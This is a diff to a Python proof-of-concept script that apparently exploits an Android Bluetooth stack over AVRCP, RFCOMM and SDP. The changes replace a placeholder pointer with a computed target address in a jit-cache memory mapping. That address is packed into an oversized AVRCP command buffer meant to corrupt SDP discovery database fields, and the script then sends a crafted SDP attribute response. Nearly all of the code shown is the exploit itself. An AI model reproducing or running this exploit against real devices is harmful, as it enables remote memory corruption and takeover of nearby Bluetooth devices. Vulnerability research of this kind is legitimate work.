@@ -97,8 +97,8 @@ async def main():
         avrcp_protocol.listen(device)
         await avrcp_protocol.connect(connection)
 
-        await asyncio.sleep(
-            1)  # TODO(zhuowei): wait for EVENT_CONNECTION instead
+        # TODO(zhuowei): wait for EVENT_CONNECTION instead
+        await asyncio.sleep(1)
 
         def my_hook(request_):
             print("got SDP, doing NOTHING", request_)
@@ -109,6 +109,7 @@ async def main():
 
         rfcomm_client = rfcomm.Client(connection)
         rfcomm_mux = await rfcomm_client.start()
+
         channel = await rfcomm_mux.open_dlc(hfp_channel_id)
         print("open dlc!!!!!!!")
         await asyncio.sleep(0.5)
@@ -128,17 +129,20 @@ async def main():
         buf_offset = 0x13
         tSDP_DISCOVERY_DB_raw_data_offset = 0x70
         # raw_data, raw_size, raw_used
+        # 76ccc61000-76d0c61000 rw-s 00000000 00:01 5731                           /memfd:jit-cache (deleted)
+        target_address = 0x7265f47000 + 0x2000000 + 0x2000
         avrcp_command_buf = b"A" * (
             tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
-                "<QII", 0x41414141_41414141, 0x41414141, 0x0) + b"\xef" * 0x80
+                "<QII", target_address, 0x41414141, 0x0) + b"\xef" * 0x80
         avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
             AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
                            0x4141, avrcp_command_buf))
+        sdp_attribute_list = bytes(sdp.DataElement.sequence([b"A" * 0x100]))
         device.sdp_server.send_response(
             sdp.SDP_ServiceSearchAttributeResponse(
                 transaction_id=requests[1].transaction_id,
-                attribute_lists_byte_count=0x100,
-                attribute_lists=b"A" * 0x100,
+                attribute_lists_byte_count=len(sdp_attribute_list),
+                attribute_lists=sdp_attribute_list,
                 continuation_state=bytes([0])))
         await asyncio.sleep(4)
 
